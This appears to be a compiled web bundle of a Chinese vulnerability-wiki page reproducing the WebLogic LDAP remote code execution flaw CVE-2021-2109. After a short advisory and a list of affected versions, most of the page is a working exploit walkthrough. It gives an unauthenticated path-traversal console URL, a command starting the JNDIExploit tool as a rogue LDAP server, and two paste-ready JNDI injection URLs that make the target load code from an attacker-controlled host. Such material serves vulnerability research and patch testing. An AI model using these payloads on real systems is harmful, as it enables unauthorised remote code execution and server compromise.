(window.webpackJsonp=window.webpackJsonp||[]).push([[106],{2819:function(e,a,s){e.exports=s.p+"assets/img/1627122357513-3368f5c9-1557-48c9-965c-478ae4d5867a.ffbcd98d.png"},2820:function(e,a,s){e.exports=s.p+"assets/img/1627122379832-ab7a422e-fc91-4e0a-8c74-ae1b27ee365a.42c4b5f2.png"},2821:function(e,a,s){e.exports=s.p+"assets/img/1627122389252-7e57ec2f-7b8c-40a6-9a93-af57d117aeec.49f78d0d.png"},2822:function(e,a,s){e.exports=s.p+"assets/img/1627122394942-2d2aefd9-5ed1-4d18-b721-f1b7c936263b.06025e9b.png"},2823:function(e,a,s){e.exports=s.p+"assets/img/1627122414874-e7efeca4-04b4-46a6-b4d7-273500602833.075c9d13.png"},3513:function(e,a,s){"use strict";s.r(a);var t=s(64),r=Object(t.a)({},(function(){var e=this,a=e._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[a("h1",{attrs:{id:"weblogic-ldap-远程代码执行漏洞-cve-2021-2109"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#weblogic-ldap-远程代码执行漏洞-cve-2021-2109"}},[e._v("#")]),e._v(" Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109")]),e._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[e._v("#")]),e._v(" 漏洞描述")]),e._v(" "),a("p",[e._v("2021年1月20日，绿盟科技监测发现Oracle官方发布了2021年1月关键补丁更新公告CPU（Critical Patch Update），共修复了329个不同程度的漏洞，其中包括7个影响WebLogic的严重漏洞（CVE-2021-1994、CVE-2021-2047、CVE-2021-2064、CVE-2021-2108、CVE-2021-2075、CVE-2019-17195、CVE-2020-14756），未经身份验证的攻击者可通过此次的漏洞实现远程代码执行。CVSS评分均为9.8，利用复杂度低。建议用户尽快采取措施，对上述漏洞进行防护。")]),e._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[e._v("#")]),e._v(" 漏洞影响")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("WebLogic Server 10.3.6.0.0")]),a("br"),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("WebLogic Server 12.1.3.0.0")]),a("br"),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("WebLogic Server 12.2.1.3.0")]),a("br"),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("WebLogic Server 12.2.1.4.0")]),a("br"),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("WebLogic Server 14.1.1.0.0")]),a("br"),e._v(" "),a("h2",{attrs:{id:"环境搭建"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[e._v("#")]),e._v(" 环境搭建")]),e._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[e._v("git clone https://github.com/vulhub/vulhub.git\ncd vulhub/weblogic/CVE-2020-14882\ndocker-compose up -d\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br")])]),a("p",[e._v("访问 "),a("code",[e._v("http://xxx.xxx.xxx.xxx:7001")]),e._v(" 正常即可")]),e._v(" "),a("p",[a("img",{attrs:{src:s(2819),alt:"img"}})]),e._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[e._v("#")]),e._v(" 漏洞复现")]),e._v(" "),a("p",[e._v("访问一下URL "),a("code",[e._v("http://xxx.xxx.xxx.xxx:7001/console/css/%2e%2e%2f/consolejndi.portal")])]),e._v(" "),a("p",[a("img",{attrs:{src:s(2820),alt:"img"}})]),e._v(" "),a("p",[e._v("如果有此页面未授权可访问，且在影响范围内则可能出现漏洞, 下载漏洞攻击需要的 LDAP启动脚本")]),e._v(" "),a("p",[a("img",{attrs:{src:s(2821),alt:"img"}})]),e._v(" "),a("p",[e._v("下载到服务器上启动")]),e._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[e._v("java")]),e._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-jar")]),e._v(" JNDIExploit-v1.11.jar "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-i")]),e._v(" xxx.xxx.xxx.xxx "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),e._v("服务器地址"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),e._v("\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:s(2822),alt:"img"}})]),e._v(" "),a("p",[e._v("然后配合 Weblogic未授权范围 命令执行")]),e._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[e._v("/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22)\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br")])]),a("a-alert",{attrs:{type:"success",message:"注意 ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho 这里 LDAP服务器地址第三个分隔符号为 ;",description:"",showIcon:""}}),e._v(" "),a("br"),e._v(" "),a("p",[a("img",{attrs:{src:s(2823),alt:"img"}})]),e._v(" "),a("p",[e._v("登录后台可使用此POC，未授权的话用上面的")]),e._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[e._v("/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22)\n")])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br")])])],1)}),[],!1,null,null,null);a.default=r.exports}}]);